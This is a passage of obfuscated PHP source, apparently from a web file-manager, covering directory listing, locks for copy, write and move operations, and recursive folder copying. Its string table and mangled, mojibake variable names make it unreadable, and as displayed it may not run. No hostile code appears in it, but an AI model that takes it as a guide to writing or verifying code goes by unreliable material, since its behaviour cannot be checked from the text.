$Š…Ş¯ñì[525]; $¬Éí˜[$Š…Ş¯ñì[492]] = $Š…Ş¯ñì[191]; $¬Éí˜[$Š…Ş¯ñì[28]] = LNG($Š…Ş¯ñì[524]); } $¬Éí˜[$Š…Ş¯ñì[526]] = $Š…Ş¯ñì[527]; } protected function _listAppendPathRoot(&$£øª³óâ, $ö°) { $ñ =& $_SERVER[èÍ×öˆøÉ]; $Í·™˜÷ì‘ = $ñ[33]; if ($£øª³óâ[$ñ[406]] == self::TYPE_USER) { if (defined($ñ[468]) && $£øª³óâ[$ñ[498]] == USER_ID) { $Í·™˜÷ì‘ = LNG($ñ[528]); if (!$ö°) { $£øª³óâ[$ñ[28]] = $Í·™˜÷ì‘; } } else { $ÆÅÂ­˜›ö· = Model($ñ[507])->getInfoSimple($£øª³óâ[$ñ[498]]); $Í·™˜÷ì‘ = LNG($ñ[529]) . $ñ[160] . $ÆÅÂ­˜›ö·[$ñ[28]] . $ñ[530]; } } else { if ($£øª³óâ[$ñ[406]] == self::TYPE_GROUP) { $ÆÅÂ­˜›ö· = Model($ñ[516])->getInfoSimple($£øª³óâ[$ñ[498]]); $Í·™˜÷ì‘ = $ÆÅÂ­˜›ö·[$ñ[28]]; } else { if ($£øª³óâ[$ñ[406]] == self::TYPE_SYSTEM) { $Í·™˜÷ì‘ = $ñ[531]; } } } $Í·™˜÷ì‘ = $Í·™˜÷ì‘ ? $ñ[8] . $Í·™˜÷ì‘ . $ñ[8] : $ñ[8]; return $Í·™˜÷ì‘; } protected function _listAppendUser(&$âúú›°Éê‚¿) { $ãÇ×üôû£ïÉŸ =& $_SERVER[èÍ×öˆøÉ]; $ãÉãŸË = array_to_keyvalue($âúú›°Éê‚¿, $ãÇ×üôû£ïÉŸ[33], $ãÇ×üôû£ïÉŸ[446]); $² = array_to_keyvalue($âúú›°Éê‚¿, $ãÇ×üôû£ïÉŸ[33], $ãÇ×üôû£ïÉŸ[448]); $ÙÜ = array_merge($ãÉãŸË, $²); $óœÃ = Model($ãÇ×üôû£ïÉŸ[532])->userListInfo($ÙÜ); foreach ($âúú›°Éê‚¿ as &$³ª) { $ëñ“ = $³ª[$ãÇ×üôû£ïÉŸ[446]]; $³ª[$ãÇ×üôû£ïÉŸ[446]] = $óœÃ[$ëñ“] ? $óœÃ[$ëñ“] : !1; $ëñ“ = $³ª[$ãÇ×üôû£ïÉŸ[448]]; $³ª[$ãÇ×üôû£ïÉŸ[448]] = $óœÃ[$ëñ“] ? $óœÃ[$ëñ“] : !1; if (isset($³ª[$ãÇ×üôû£ïÉŸ[459]]) && $³ª[$ãÇ×üôû£ïÉŸ[459]][$ãÇ×üôû£ïÉŸ[533]]) { $Ï¯¡ÏÃığÇ‘ = $GLOBALS[$ãÇ×üôû£ïÉŸ[6]][$ãÇ×üôû£ïÉŸ[88]][$ãÇ×üôû£ïÉŸ[534]]; if ($³ª[$ãÇ×üôû£ïÉŸ[459]][$ãÇ×üôû£ïÉŸ[535]] <= time() - $Ï¯¡ÏÃığÇ‘) { $this->metaSet($³ª[$ãÇ×üôû£ïÉŸ[397]], $ãÇ×üôû£ïÉŸ[533], null); $this->metaSet($³ª[$ãÇ×üôû£ïÉŸ[397]], $ãÇ×üôû£ïÉŸ[535], null); unset($³ª[$ãÇ×üôû£ïÉŸ[459]][$ãÇ×üôû£ïÉŸ[533]]); continue; } $³ì¬¿ùâıÑ = $³ª[$ãÇ×üôû£ïÉŸ[459]][$ãÇ×üôû£ïÉŸ[533]]; $³ª[$ãÇ×üôû£ïÉŸ[459]][$ãÇ×üôû£ïÉŸ[536]] = Model($ãÇ×üôû£ïÉŸ[532])->getInfoSimpleOuter($³ì¬¿ùâıÑ); } } unset($³ª); } public function parentLevelArray($×Ú¼£Ê) { $àİÊ =& $_SERVER[èÍ×öˆøÉ]; $×Ú¼£Ê = explode($àİÊ[47], trim($×Ú¼£Ê, $àİÊ[47])); return array_remove_value($×Ú¼£Ê, $àİÊ[191]); } public function listAll($‡‚¨‰àÈ‚) { $£Úë° =& $_SERVER[èÍ×öˆøÉ]; $ÈŒĞƒİ¤—ö = $this->sourceInfo($‡‚¨‰àÈ‚); $Ÿ‹¯Üé±¾®Œè = array($£Úë°[537] => array($£Úë°[538], $ÈŒĞƒİ¤—ö[$£Úë°[515]] . $‡‚¨‰àÈ‚ . $£Úë°[539]), $£Úë°[540] => 0); $ïÆğîó¿Íå÷ = $£Úë°[541]; $¦á¿øÔÜ = "\x4c\x45\106\124\x20\112\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\146\x69\x6c\145\x20\146\151\x6c\x65\x20\157\156\40\x73\157\x75\162\x63\x65\x2e\146\151\x6c\x65\111\104\40\x3d\40\146\x69\154\x65\56\146\151\x6c\x65\111\x44"; $Ôâ = $this->alias($£Úë°[438])->field($ïÆğîó¿Íå÷)->where($Ÿ‹¯Üé±¾®Œè)->join($¦á¿øÔÜ)->select(); $this->_listAppendAuth($Ôâ); $this->_listAppendUser($Ôâ); $this->_listAppendPath($Ôâ); $Ôâ = array_to_keyvalue($Ôâ, $£Úë°[397]); $æøµì…ë¥÷ = "\57{$ÈŒĞƒİ¤—ö[$£Úë°[28]]}\x2f"; $æøµì…ë¥÷ = $æøµì…ë¥÷ == $£Úë°[523] ? $£Úë°[8] : $æøµì…ë¥÷; $»¡ = array(); foreach ($Ôâ as $Øè©ª => $Á¶ëÏê¡) { $–ÚÔÓ¼ê = $this->parentLevelArray($Á¶ëÏê¡[$£Úë°[515]]); array_shift($–ÚÔÓ¼ê); $ºÒœ´ƒ®š¤­ = $æøµì…ë¥÷; for ($¥–ş = 0; $¥–ş < count($–ÚÔÓ¼ê); $¥–ş++) { $ºÒœ´ƒ®š¤­ .= $Ôâ[$–ÚÔÓ¼ê[$¥–ş]][$£Úë°[28]] . $£Úë°[8]; } $ºÒœ´ƒ®š¤­ .= $Á¶ëÏê¡[$£Úë°[28]]; if ($Á¶ëÏê¡[$£Úë°[405]]) { $ºÒœ´ƒ®š¤­ .= $£Úë°[8]; } $ºÒœ´ƒ®š¤­ = str_replace($£Úë°[523], $£Úë°[8], $ºÒœ´ƒ®š¤­); $ºÒœ´ƒ®š¤­ = str_replace($£Úë°[523], $£Úë°[8], $ºÒœ´ƒ®š¤­); $Ø…ß˜ = array($£Úë°[416] => str_replace($£Úë°[523], $£Úë°[8], $ºÒœ´ƒ®š¤­), $£Úë°[542] => intval($Á¶ëÏê¡[$£Úë°[405]]), $£Úë°[85] => $this->pathInfoFilter($Á¶ëÏê¡)); if (!$Á¶ëÏê¡[$£Úë°[405]]) { $Ø…ß˜[$£Úë°[461]] = $Á¶ëÏê¡[$£Úë°[461]]; $Ø…ß˜[$£Úë°[86]] = $Á¶ëÏê¡[$£Úë°[76]]; } $»¡[] = $Ø…ß˜; } return $»¡; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($•ÂÅ) { $øÄ¼¤º =& $_SERVER[èÍ×öˆøÉ]; if (!$this->allowLock()) { return; } $this->_lockCheck($øÄ¼¤º[543], $•ÂÅ); $˜Ñà = 1; $this->_lockEvent($•ÂÅ, array($øÄ¼¤º[544], $øÄ¼¤º[545]), $˜Ñà); $this->_lockParent($•ÂÅ, array($øÄ¼¤º[545]), $˜Ñà); $this->_lockEvent($•ÂÅ, array($øÄ¼¤º[546], $øÄ¼¤º[547]), $˜Ñà); $this->_lockCheckEnd($øÄ¼¤º[543], $•ÂÅ); } public function lockCopyEnd($®·Ö½ö¢) { $ôõò€ãã§ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->allowLock()) { return; } $ø = 0; $this->_lockEvent($®·Ö½ö¢, array($ôõò€ãã§[544], $ôõò€ãã§[545]), $ø); $this->_lockParent($®·Ö½ö¢, array($ôõò€ãã§[545]), $ø); $this->_lockEvent($®·Ö½ö¢, array($ôõò€ãã§[546], $ôõò€ãã§[547]), $ø); } public function lockWriteStart($™‰, $‘©ï = '') { $ãç‡Ş÷ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ãç‡Ş÷[544], $™‰); $©ŸÃÂÛ = 1; $this->_lockKey($ãç‡Ş÷[548] . $™‰ . $ãç‡Ş÷[95] . $‘©ï, $©ŸÃÂÛ); $this->_lockEvent($™‰, array($ãç‡Ş÷[543], $ãç‡Ş÷[545]), $©ŸÃÂÛ); $this->_lockParent($™‰, array($ãç‡Ş÷[543], $ãç‡Ş÷[545]), $©ŸÃÂÛ); $this->_lockCheckEnd($ãç‡Ş÷[544], $™‰); } public function lockWriteEnd($×ˆõ¿, $µĞöïÁÔ = '') { $õ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->allowLock()) { return; } $şÒîû ­ = 0; $this->_lockKey($õ[548] . $×ˆõ¿ . $õ[95] . $µĞöïÁÔ, $şÒîû ­); $this->_lockEvent($×ˆõ¿, array($õ[543], $õ[545]), $şÒîû ­); $this->_lockParent($×ˆõ¿, array($õ[543], $õ[545]), $şÒîû ­); } public function lockMoveStart($éœâ“¬) { $ü¥°Åêğ—’ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ü¥°Åêğ—’[545], $éœâ“¬); $İ£Ç«Á²Í = 1; $this->_lockKey($ü¥°Åêğ—’[549] . $éœâ“¬, $İ£Ç«Á²Í); $this->_lockEvent($éœâ“¬, array($ü¥°Åêğ—’[543], $ü¥°Åêğ—’[544]), $İ£Ç«Á²Í); $this->_lockParent($éœâ“¬, array($ü¥°Åêğ—’[543], $ü¥°Åêğ—’[545]), $İ£Ç«Á²Í); $this->_lockEvent($éœâ“¬, array($ü¥°Åêğ—’[550], $ü¥°Åêğ—’[546], $ü¥°Åêğ—’[547]), $İ£Ç«Á²Í); $this->_lockCheckEnd($ü¥°Åêğ—’[545], $éœâ“¬); } public function lockMoveEnd($ƒè—) { $ÆŠ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->allowLock()) { return; } $ıê¦‹ö = 0; $this->_lockKey($ÆŠ[549] . $ƒè—, $ıê¦‹ö); $this->_lockEvent($ƒè—, array($ÆŠ[543], $ÆŠ[544]), $ıê¦‹ö); $this->_lockParent($ƒè—, array($ÆŠ[543], $ÆŠ[545]), $ıê¦‹ö); $this->_lockEvent($ƒè—, array($ÆŠ[550], $ÆŠ[546], $ÆŠ[547]), $ıê¦‹ö); } private function _lockCheck($Œ„¥Ş¸, $„ıí²éÃ) { $»‹ı =& $_SERVER[èÍ×öˆøÉ]; $©  = $this->sourceInfo($„ıí²éÃ); $ ­şÛ«›öœ = $Œ„¥Ş¸ . $»‹ı[95] . $„ıí²éÃ; $this->_lockTimeStart[$ ­şÛ«›öœ] = timeFloat(); if (!is_array($© )) { return; } $ûÙ± = LNG($»‹ı[551]); CacheLock::setErrorMsg($»‹ı[160] . htmlspecialchars($© [$»‹ı[28]]) . $»‹ı[530] . $ûÙ±); $this->_lockKey($ ­şÛ«›öœ, 1); $this->_lockKey($ ­şÛ«›öœ, 0); $¿ƒ°È = array_reverse($this->parentLevelArray($© [$»‹ı[515]])); foreach ($¿ƒ°È as $ûÇÅ) { $ ­şÛ«›öœ = $Œ„¥Ş¸ . $»‹ı[552] . $ûÇÅ; if (CacheLock::lockGet($»‹ı[553] . $ ­şÛ«›öœ)) { $©  = $this->sourceInfo($ûÇÅ); CacheLock::setErrorMsg($»‹ı[160] . htmlspecialchars($© [$»‹ı[28]]) . $»‹ı[530] . $ûÙ±); $this->_lockKey($ ­şÛ«›öœ, 1); $this->_lockKey($ ­şÛ«›öœ, 0); } } } private function _lockCheckEnd($¼„õÍŠó£, $¯Àò) { $çº =& $_SERVER[èÍ×öˆøÉ]; $ÔÌö°×˜Û = $¼„õÍŠó£ . $çº[95] . $¯Àò; CacheLock::setErrorMsg($çº[376]); if (!isset($this->_lockTimeStart[$ÔÌö°×˜Û])) { return; } $ó—ÄóŒØ = timeFloat() - $this->_lockTimeStart[$ÔÌö°×˜Û]; unset($this->_lockTimeStart[$ÔÌö°×˜Û]); if ($ó—ÄóŒØ > 0.5) { unset(self::$cacheSourceInfo[$çº[452] . $¯Àò]); } $ïÖŒã¦¼Ë = $this->sourceInfo($¯Àò); if (!$ïÖŒã¦¼Ë) { show_json(LNG($çº[105]), !1); } } private function _lockParent($•ĞÇˆƒˆ¢Å, $†´®©¹Ø, $ğŞ) { if (!$this->autoLockSet) { return; } $÷º§¨ÀÜ‚ë = $this->sourceInfo($•ĞÇˆƒˆ¢Å); if (!is_array($÷º§¨ÀÜ‚ë)) { return; } $¿ûÂ›ğµ = array_reverse($this->parentLevelArray($÷º§¨ÀÜ‚ë[$_SERVER[èÍ×öˆøÉ][515]])); foreach ($¿ûÂ›ğµ as $¨·) { $this->_lockEvent($¨·, $†´®©¹Ø, $ğŞ); } } private function _lockEvent($Ô, $’º, $Ó•¤´¿Äû­ƒ) { $Š™®­± =& $_SERVER[èÍ×öˆøÉ]; if (!$this->autoLockSet) { return; } foreach ($’º as $§ÈÈŞ) { $ıÖ ¦„ÂÍ“è = $§ÈÈŞ . $Š™®­±[95] . $Ô; if ($Ó•¤´¿Äû­ƒ && CacheLock::lockGet($Š™®­±[553] . $ıÖ ¦„ÂÍ“è)) { continue; } $this->_lockKey($ıÖ ¦„ÂÍ“è, $Ó•¤´¿Äû­ƒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ïÃ…àÙ, $«ğÈŞÃ¿âÔåŒ = 1) { $çöš = $_SERVER[èÍ×öˆøÉ][553] . md5($ïÃ…àÙ); if ($«ğÈŞÃ¿âÔåŒ) { if (isset(self::$_lockItemArr[$çöš])) { return; } self::$_lockItemArr[$çöš] = 1; CacheLock::lock($çöš, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$çöš])) { return; } unset(self::$_lockItemArr[$çöš]); CacheLock::unlock($çöš); } } public function isParentOf($ö¶ü…ıĞ¨, $¾›êä) { $º ì =& $_SERVER[èÍ×öˆøÉ]; $Ë¦åİ×‚ı¿şŒ = $this->sourceInfo($ö¶ü…ıĞ¨); $éÛ‡Ñó = $this->sourceInfo($¾›êä); $—áÕ†ûúÄÁë = $Ë¦åİ×‚ı¿şŒ[$º ì[515]] . $Ë¦åİ×‚ı¿şŒ[$º ì[397]] . $º ì[47]; $©¥ = $éÛ‡Ñó[$º ì[515]] . $éÛ‡Ñó[$º ì[397]] . $º ì[47]; $ó¢ô‚İãõ = strpos($©¥, $—áÕ†ûúÄÁë) === 0; return $ó¢ô‚İãõ; } private $targetIsDelete = 0; public function copy($¸•Á¸³‹Ê¨¯Ó, $“×æÍ¹ã˜Ò, $úı¨ËÍ±çËÃ¨ = REPEAT_REPLACE, $ï» = '') { $É‡›ğúôç =& $_SERVER[èÍ×öˆøÉ]; $ìŒ“„¤–•‘¥ = $this->sourceInfo($¸•Á¸³‹Ê¨¯Ó); $˜¢˜´Ã¸ˆá = $this->sourceInfo($“×æÍ¹ã˜Ò); if (!$ìŒ“„¤–•‘¥ || !$˜¢˜´Ã¸ˆá || $˜¢˜´Ã¸ˆá[$É‡›ğúôç[405]] != $É‡›ğúôç[87]) { return !1; } if ($this->isParentOf($¸•Á¸³‹Ê¨¯Ó, $“×æÍ¹ã˜Ò)) { return !1; } $áåûı†úÑõ = $ï» ? $ï» : $ìŒ“„¤–•‘¥[$É‡›ğúôç[28]]; $this->lockCopyStart($¸•Á¸³‹Ê¨¯Ó); $this->lockWriteStart($“×æÍ¹ã˜Ò, $áåûı†úÑõ); $‘²³Î¬ = array($É‡›ğúôç[554] => array(), $É‡›ğúôç[555] => array(), $É‡›ğúôç[556] => array()); $this->targetIsDelete = intval($ìŒ“„¤–•‘¥[$É‡›ğúôç[425]]); $ÇŸş—É£ = $this->fileNameExistCache($“×æÍ¹ã˜Ò, $ìŒ“„¤–•‘¥[$É‡›ğúôç[28]]); $ø = $this->_copy($¸•Á¸³‹Ê¨¯Ó, $“×æÍ¹ã˜Ò, $úı¨ËÍ±çËÃ¨, $‘²³Î¬, !0, $ï»); $this->_childrenListClear(); $this->lockCopyEnd($¸•Á¸³‹Ê¨¯Ó); $this->lockWriteEnd($“×æÍ¹ã˜Ò, $áåûı†úÑõ); if ($ìŒ“„¤–•‘¥[$É‡›ğúôç[405]] == $É‡›ğúôç[87] && $ÇŸş—É£ == $ø) { $this->folderSizeResetChildren($ÇŸş—É£); } Model($É‡›ğúôç[557])->addAll($‘²³Î¬[$É‡›ğúôç[555]], array(), !0); if ($ÇŸş—É£ != $ø || $ìŒ“„¤–•‘¥[$É‡›ğúôç[405]] == $É‡›ğúôç[87]) { Model($É‡›ğúôç[558])->eventCopy($ø); } $this->saveAll($‘²³Î¬[$É‡›ğúôç[556]]); Model($É‡›ğúôç[193])->linkAdd($‘²³Î¬[$É‡›ğúôç[554]]); $this->folderSizeReset($“×æÍ¹ã˜Ò); $this->updateModifyTime($“×æÍ¹ã˜Ò); return $ø; } private function _copy($’±Æ, $ïÄ»¤, $õä¿, &$¬¯¬, $É® åÛå, $ÌÕƒÑ¹ÛÚ = '') { $ğ´ =& $_SERVER[èÍ×öˆøÉ]; $šÏßÅÏù÷ÕçÂ = $this->sourceInfoCache($’±Æ); $œî‹œæ = $šÏßÅÏù÷ÕçÂ[$ğ´[405]] == $ğ´[87]; $™éı¨¦‚¹Ù›‰ = $ÌÕƒÑ¹ÛÚ ? $ÌÕƒÑ¹ÛÚ : $šÏßÅÏù÷ÕçÂ[$ğ´[28]]; $›¦ù†¹ÆÃ = $this->fileNameExistCache($ïÄ»¤, $™éı¨¦‚¹Ù›‰); if ($É® åÛå) { $this->_childrenAllMake($’±Æ); if ($œî‹œæ && $›¦ù†¹ÆÃ) { $this->_childrenAllMake($›¦ù†¹ÆÃ); } } if (!$›¦ù†¹ÆÃ) { return $this->_copyCreate($’±Æ, $ïÄ»¤, $™éı¨¦‚¹Ù›‰, $¬¯¬); } $öÃòëöËò¦Š = $›¦ù†¹ÆÃ; if ($œî‹œæ) { if ($õä¿ == REPEAT_RENAME_FOLDER) { $™éı¨¦‚¹Ù›‰ = $this->fileNameAutoCache($ïÄ»¤, $™éı¨¦‚¹Ù›‰, $õä¿, $œî‹œæ); $öÃòëöËò¦Š = $this->_copyCreate($’±Æ, $ïÄ»¤, $™éı¨¦‚¹Ù›‰, $¬¯¬); } else { $¸ãÊö¹ = $this->_childrenList($’±Æ); foreach ($¸ãÊö¹ as $©â) { $this->_copy($©â[$ğ´[397]], $›¦ù†¹ÆÃ, $õä¿, $¬¯¬, !1); } } } else { if ($õä¿ == REPEAT_RENAME || $õä¿ == REPEAT_RENAME_FOLDER) { $™éı¨¦‚¹Ù›‰ = $this->fileNameAutoCache($ïÄ»¤, $™éı¨¦‚¹Ù›‰, $õä¿, $œî‹œæ); $öÃòëöËò¦Š = $this->_copyCreate($’±Æ, $ïÄ»¤, $™éı¨¦‚¹Ù›‰, $¬¯¬); } else { if ($õä¿ == REPEAT_REPLACE) { $»Æ… = $this->sourceInfoCache($›¦ù†¹ÆÃ); $å©ÒÎ = $this->fileHistory($»Æ…, $šÏßÅÏù÷ÕçÂ[$ğ´[461]], $šÏßÅÏù÷ÕçÂ[$ğ´[78]]); if ($å©ÒÎ) { $¬¯¬[$ğ´[554]][] = $šÏßÅÏù÷ÕçÂ[$ğ´[461]]; } } else { if ($õä¿ == REPEAT_SKIP) { } } } Hook::trigger($ğ´[559], array($ğ´[560], $šÏßÅÏù÷ÕçÂ, 0)); } return $öÃòëöËò¦Š; } private function _copyCreate($˜ˆâ–, $˜˜Õñ¥, $‚ìö²Î‚’³, &$Îğ‡) { $ÉõéÛÖ×²€ê =& $_SERVER[èÍ×öˆøÉ]; $£é¼ú• = $this->sourceInfoCache($˜ˆâ–); $Ùº€ä³¿Ä®× = $this->sourceInfoCache($˜˜Õñ¥); $¹¦…¦Ğ¼‹ï€‹ = $this->_makeItemData($£é¼ú•, $Ùº€ä³¿Ä®×, $‚ìö²Î‚’³); Hook::trigger($ÉõéÛÖ×²€ê[561], $¹¦…¦Ğ¼‹ï€‹); Hook::trigger($ÉõéÛÖ×²€ê[562], array($ÉõéÛÖ×²€ê[563], $¹¦…¦Ğ¼‹ï€‹, 0)); $ì€£˜½ğğ = $this->add($¹¦…¦Ğ¼‹ï€‹); $×¶´Ï…—ö´ã = array($ÉõéÛÖ×²€ê[397] => $ì€£˜½ğğ, $ÉõéÛÖ×²€ê[28] => $‚ìö²Î‚’³); $this->_copyApplyMeta($×¶´Ï…—ö´ã, $Îğ‡); if ($£é¼ú•[$ÉõéÛÖ×²€ê[405]] != $ÉõéÛÖ×²€ê[87]) { $Îğ‡[$ÉõéÛÖ×²€ê[554]][] = $£é¼ú•[$ÉõéÛÖ×²€ê[461]]; return $ì€£˜½ğğ; } $àÆ¼İ€ƒ¿ù‡ö = array(); $ş = array(); $this->_childrenListAll($˜ˆâ–, $àÆ¼İ€ƒ¿ù‡ö); $¦  = count($àÆ¼İ€ƒ¿ù‡ö); if ($¦  == 0) { return $ì€£˜½ğğ; } $ÕáÃşë = $this->sourceInfo($ì€£˜½ğğ); foreach ($àÆ¼İ€ƒ¿ù‡ö as $“ıû) { $ÔŞŞ¼°«‹í¥Ô = $this->_makeItemData($“ıû, $ÕáÃşë, $“ıû[$ÉõéÛÖ×²€ê[28]]); $ÔŞŞ¼°«‹í¥Ô[$ÉõéÛÖ×²€ê[515]] = $“ıû[$ÉõéÛÖ×²€ê[515]]; $ş[] = $ÔŞŞ¼°«‹í¥Ô; } $this->chunkEventSet($ÉõéÛÖ×²€ê[564], array($ÉõéÛÖ×²€ê[565], $¹¦…¦Ğ¼‹ï€‹, $¦ )); $this->addAll($ş, array(), !1); $‰‘ó®Õ = $this->where(array($ÉõéÛÖ×²€ê[492] => $ì€£˜½ğğ))->select(); $Óñá­¾®ñ‰ß = $this->_childrenMakeRelation($àÆ¼İ€ƒ¿ù‡ö, $‰‘ó®Õ); $Óñá­¾®ñ‰ß[$˜ˆâ–] = $ì€£˜½ğğ; $ù˜Ûƒ”Å = array(); $ôª = array(); foreach ($‰‘ó®Õ as $“ıû) { $é = $“ıû[$ÉõéÛÖ×²€ê[397]]; $äñ¹Ã = $this->_childrenMatch($Óñá­¾®ñ‰ß, $“ıû, $ÕáÃşë); $ù˜Ûƒ”Å[] = array($ÉõéÛÖ×²€ê[397], $é, $ÉõéÛÖ×²€ê[492], $äñ¹Ã[$ÉõéÛÖ×²€ê[492]]); $ôª[] = array($ÉõéÛÖ×²€ê[397], $é, $ÉõéÛÖ×²€ê[515], $äñ¹Ã[$ÉõéÛÖ×²€ê[515]]); $this->_copyApplyMeta($“ıû, $Îğ‡); if ($“ıû[$ÉõéÛÖ×²€ê[405]] != $ÉõéÛÖ×²€ê[87]) { $Îğ‡[$ÉõéÛÖ×²€ê[554]][] = $“ıû[$ÉõéÛÖ×²€ê[461]]; } } $this->chunkEventSet($ÉõéÛÖ×²€ê[566], array($ÉõéÛÖ×²€ê[567], $¹¦…¦Ğ¼‹ï€‹, $¦ )); $this->saveAll($ù˜Ûƒ”Å); $this->chunkEventSet($ÉõéÛÖ×²€ê[568], array($ÉõéÛÖ×²€ê[569], $¹¦…¦Ğ¼‹ï€‹, $¦ )); $this->saveAll($ôª); return $ì€£˜½ğğ; } private function _childrenMakeRelation($©Ç¢ºÂ›’÷, $Ü˜“Ô) { $¾µş =& $_SERVER[èÍ×öˆøÉ]; $çòÀÃóƒœ¡“Ò = array(); $‘“ÚÍ = array(); foreach ($©Ç¢ºÂ›’÷ as $ı¤) { $ş = $ı¤[$¾µş[28]] . $¾µş[8] . $ı¤[$¾µş[515]]; $çòÀÃóƒœ¡“Ò[$ş] = $ı¤[$¾µş[397]]; } foreach ($Ü˜“Ô as $ı¤) { $ş = $ı¤[$¾µş[28]] . $¾µş[8] . $ı¤[$¾µş[515]]; $í€ = $çòÀÃóƒœ¡“Ò[$ş]; $‘“ÚÍ[$í€] = $ı¤[$¾µş[397]]; } return $‘“ÚÍ; } private function _childrenMatch($ß¨µ·, $Å¹¬°», $“ìÈıÍ†À¥å) { $åºªë¯»  =& $_SERVER[èÍ×öˆøÉ]; $á½º¢¦ôå˜è = $“ìÈıÍ†À¥å[$åºªë¯» [515]]; $˜Ï®ŒïÍ = $this->parentLevelArray($Å¹¬°»[$åºªë¯» [515]]); foreach ($˜Ï®ŒïÍ as $Àí¦Ø) { if (isset($ß¨µ·[$Àí¦Ø])) { $á½º¢¦ôå˜è .= $ß¨µ·[$Àí¦Ø] . $åºªë¯» [570]; } } $á½º¢¦ôå˜è = rtrim($á½º¢¦ôå˜è, $åºªë¯» [47]) . $åºªë¯» [47]; $›ôôÒå‚ØÑò‘ = $this->parentLevelArray($á½º¢¦ôå˜è); $Õ‰ĞéäÊ = $›ôôÒå‚ØÑò‘[count($›ôôÒå‚ØÑò‘) - 1]; return array($åºªë¯» [492] => $Õ‰ĞéäÊ, $åºªë¯» [515] => $á½º¢¦ôå˜è); } private function _makeItemData($Èä, $”ú, $İ„­’Ã) { $µÓÌØ =& $_SERVER[èÍ×öˆøÉ]; $§õÇ = array($µÓÌØ[571] => $Èä[$µÓÌØ[405]], $µÓÌØ[415] => $İ„­’Ã, $µÓÌØ[572] => $Èä[$µÓÌØ[407]] ? $Èä[$µÓÌØ[407]] : $µÓÌØ[33], $µÓÌØ[462] => $Èä[$µÓÌØ[461]] ? $Èä[$µÓÌØ[461]] : 0, $µÓÌØ[573] => $Èä[$µÓÌØ[78]] ? $Èä[$µÓÌØ[78]] : 0, $µÓÌØ[574] => intval($”ú[$µÓÌØ[406]]), $µÓÌØ[575] => intval($”ú[$µÓÌØ[498]]), $µÓÌØ[576] => intval(USER_ID), $µÓÌØ[577] => intval(USER_ID), $µÓÌØ[396] => intval($”ú[$µÓÌØ[397]]), $µÓÌØ[578] => $”ú[$µÓÌØ[515]] . $”ú[$µÓÌØ[397]] . $µÓÌØ[47], $µÓÌØ[419] => $Èä[$µÓÌØ[84]] ? $Èä[$µÓÌØ[84]] : time(), $µÓÌØ[424] => 0, $µÓÌØ[579] => $µÓÌØ[33]); return $§õÇ; } private function _copyApplyMeta($©…ÄãìÅª‹, &$Í¤§Œà…å) { $àúÒË‹ =& $_SERVER[èÍ×öˆøÉ]; $û¿†§¬È = $©…ÄãìÅª‹[$àúÒË‹[397]]; $µªß³ğ = $©…ÄãìÅª‹[$àúÒË‹[28]]; if (!isset($©…ÄãìÅª‹[$àúÒË‹[580]]) || !$©…ÄãìÅª‹[$àúÒË‹[580]] || $©…ÄãìÅª‹[$àúÒË‹[580]] == $àúÒË‹[191]) { $Í¤§Œà…å[$àúÒË‹[556]][] = array($àúÒË‹[397], $û¿†§¬È, $àúÒË‹[580], short_id($û¿†§¬È)); } if (Input::check($µªß³ğ, $àúÒË‹[581])) { $Í¤§Œà…å[$àúÒË‹[555]][] = array($àúÒË‹[397] => $û¿†§¬È, $àúÒË‹[93] => $àúÒË‹[458], $àúÒË‹[372] => str_replace($àúÒË‹[50], $àúÒË‹[33], Pinyin::get($µªß³ğ))); $Í¤§Œà…å[$àúÒË‹[555]][] = array($àúÒË‹[397] => $û¿†§¬È, $àúÒË‹[93] => $àúÒË‹[457], $àúÒË‹[372] => Pinyin::get($µªß³ğ, $àúÒË‹[582])); } $Í¤§Œà…å[$àúÒË‹[555]][] = array($àúÒË‹[397] => $û¿†§¬È, $àúÒË‹[93] => $àúÒË‹[436], $àúÒË‹[372] => KodSort::makeStr($µªß³ğ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ˆƒÆûĞ¹) { $Ò“Ÿš’æ”á÷Ç =& $_SERVER[èÍ×öˆøÉ]; $“–ç»¾Â = $this->sourceInfo($ˆƒÆûĞ¹); $Œã”² = $Ò“Ÿš’æ”á÷Ç[583]; $¿âú”È¿…’ = array($Ò“Ÿš’æ”á÷Ç[515] => array($Ò“Ÿš’æ”á÷Ç[538], $“–ç»¾Â[$Ò“Ÿš’æ”á÷Ç[515]] . $ˆƒÆûĞ¹ . $Ò“Ÿš’æ”á÷Ç[539]), $Ò“Ÿš’æ”á÷Ç[425] => $this->targetIsDelete); $³¥©»¡¡Ş = $this->field($Œã”²)->where($¿âú”È¿…’)->select(); if (!$³¥©»¡¡Ş) { return; } $³¥©»¡¡Ş = array_to_keyvalue($³¥©»¡¡Ş, $Ò“Ÿš’æ”á÷Ç[397]); foreach ($³¥©»¡¡Ş as $Î®ÄØ­) { $ªŸÓï„§ = $Î®ÄØ­[$Ò“Ÿš’æ”á÷Ç[492]]; $ˆƒÆûĞ¹ = $Î®ÄØ­[$Ò“Ÿš’æ”á÷Ç[397]]; if (!isset($this->_childrenListCache[$ˆƒÆûĞ¹]) && $Î®ÄØ­[$Ò“Ÿš’æ”á÷Ç[405]] == $Ò“Ÿš’æ”á÷Ç[87]) { $this->_childrenListCache[$ˆƒÆûĞ¹] = array(); } if (!isset($this->_childrenListCache[$ªŸÓï„§])) { $this->_childrenListCache[$ªŸÓï„§] = array(); } $this->_childrenListCache[$ªŸÓï„§][$ˆƒÆûĞ¹] = $Î®ÄØ­; $this->_childrenItemCache[$ˆƒÆûĞ¹] = $Î®ÄØ­; } } private function _childrenListAll($óÅüÚ¶²š­, &$Ã…¢·Æ²‡) { $ƒğÄ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->_childrenListCache[$óÅüÚ¶²š­])) { return; } $ıªä²À¦‰—Ò = $this->_childrenListCache[$óÅüÚ¶²š­]; foreach ($ıªä²À¦‰—Ò as $ÈÌ“¤Àø => $÷ÔÉ‰ÓÆá) { 